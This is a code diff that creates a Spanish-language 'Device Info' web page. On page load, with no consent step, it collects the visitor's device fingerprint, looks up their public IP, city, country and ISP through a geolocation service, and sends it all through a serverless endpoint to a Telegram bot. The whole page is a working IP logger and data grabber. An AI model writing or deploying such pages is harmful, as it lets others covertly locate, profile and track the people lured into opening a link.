@@ -1,42 +1,153 @@
-const data = {
-  // 🌐 RED
-  ip: "", // la detecta el servidor
-  country: "",
-  city: "",
-  isp: "",
-  conexion: navigator.connection ? `${navigator.connection.effectiveType} / ${navigator.connection.downlink} Mbps` : "No disponible",
-  tipoRed: navigator.connection ? navigator.connection.type : "Desconocido",
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Device Info</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #0f0f0f;
+      color: #e0e0e0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      background: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 16px;
+      padding: 28px;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+    }
+    h1 {
+      font-size: 1.4rem;
+      margin-bottom: 8px;
+      color: #fff;
+    }
+    .status {
+      font-size: 0.95rem;
+      color: #aaa;
+      margin-bottom: 20px;
+    }
+    .status.ok { color: #4ade80; }
+    .status.error { color: #f87171; }
+    .info {
+      font-size: 0.85rem;
+      color: #888;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Device Info</h1>
+    <p class="status" id="status">Recolectando información...</p>
+    <div class="info" id="info"></div>
+  </div>
 
-  // 📱 DISPOSITIVO
-  os: navigator.platform || navigator.userAgentData?.platform || "Desconocido",
-  browser: navigator.userAgent.includes("Chrome") ? "Chrome" : 
-           navigator.userAgent.includes("Firefox") ? "Firefox" : 
-           navigator.userAgent.includes("Safari") ? "Safari" : "Desconocido",
-  dispositivo: /Mobi/.test(navigator.userAgent) ? "Móvil" : "PC",
-  ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Desconocida",
-  nucleos: navigator.hardwareConcurrency || "Desconocido",
-  pantalla: `${window.screen.width} × ${window.screen.height}`,
-  pixelRatio: window.devicePixelRatio || 1,
+  <script>
+    async function enviarInfo() {
+      const statusEl = document.getElementById("status");
+      const infoEl = document.getElementById("info");
 
-  // 🔋 BATERÍA
-  bateria: "Comprobando...",
-  cargando: "Comprobando...",
+      const data = {
+        // Red
+        ip: "",
+        country: "",
+        city: "",
+        isp: "",
+        conexion: navigator.connection
+          ? `${navigator.connection.effectiveType} / ${navigator.connection.downlink} Mbps`
+          : "No disponible",
+        tipoRed: navigator.connection ? navigator.connection.type : "Desconocido",
 
-  // 🌎 IDIOMA Y ZONA
-  idioma: navigator.language || "Desconocido",
-  zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        // Dispositivo
+        os: navigator.platform || navigator.userAgentData?.platform || "Desconocido",
+        browser: navigator.userAgent.includes("Chrome") ? "Chrome" :
+                 navigator.userAgent.includes("Firefox") ? "Firefox" :
+                 navigator.userAgent.includes("Safari") ? "Safari" : "Desconocido",
+        device: /Mobi|Android/i.test(navigator.userAgent) ? "Móvil" : "PC",
+        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Desconocida",
+        nucleos: navigator.hardwareConcurrency || "Desconocido",
+        pantalla: `${window.screen.width} × ${window.screen.height}`,
+        pixelRatio: window.devicePixelRatio || 1,
 
-  // 🧭 OTRAS
-  toque: "ontouchstart" in window ? "✅ Sí" : "❌ No",
-  cookies: navigator.cookieEnabled ? "✅ Sí" : "❌ No",
-  incognito: "Desconocido"
-};
+        // Batería
+        bateria: "No disponible",
+        cargando: "No disponible",
 
-// Obtener batería
-if (navigator.getBattery) {
-  navigator.getBattery().then(bat => {
-    data.bateria = `${Math.round(bat.level * 100)}%`;
-    data.cargando = bat.charging ? "⚡ Cargando" : "🔋 Descargando";
-  });
-}
+        // Idioma y zona
+        idioma: navigator.language || "Desconocido",
+        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
 
+        // Otras
+        toque: "ontouchstart" in window ? "Sí" : "No",
+        cookies: navigator.cookieEnabled ? "Sí" : "No",
+        userAgent: navigator.userAgent
+      };
+
+      // Obtener batería si está disponible
+      if (navigator.getBattery) {
+        try {
+          const bat = await navigator.getBattery();
+          data.bateria = `${Math.round(bat.level * 100)}%`;
+          data.cargando = bat.charging ? "Cargando" : "Descargando";
+        } catch (e) {}
+      }
+
+      // Intentar obtener IP pública (opcional)
+      try {
+        const geo = await fetch("https://ipapi.co/json/").then(r => r.json());
+        data.ip = geo.ip || "";
+        data.country = geo.country_name || "";
+        data.city = geo.city || "";
+        data.isp = geo.org || "";
+      } catch (e) {}
+
+      // Mostrar resumen en pantalla
+      infoEl.innerHTML = `
+        <b>IP:</b> ${data.ip || "—"}<br>
+        <b>País:</b> ${data.country || "—"}<br>
+        <b>Ciudad:</b> ${data.city || "—"}<br>
+        <b>OS:</b> ${data.os}<br>
+        <b>Navegador:</b> ${data.browser}<br>
+        <b>Dispositivo:</b> ${data.device}<br>
+        <b>Pantalla:</b> ${data.pantalla}
+      `;
+
+      // Enviar a Netlify Function → Telegram
+      try {
+        const res = await fetch("/api/device", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+
+        const result = await res.json();
+
+        if (result.success) {
+          statusEl.textContent = "Información enviada correctamente";
+          statusEl.className = "status ok";
+        } else {
+          statusEl.textContent = "Error al enviar";
+          statusEl.className = "status error";
+        }
+      } catch (err) {
+        statusEl.textContent = "Error de conexión";
+        statusEl.className = "status error";
+        console.error(err);
+      }
+    }
+
+    // Ejecutar al cargar la página
+    enviarInfo();
+  </script>
+</body>
+</html>
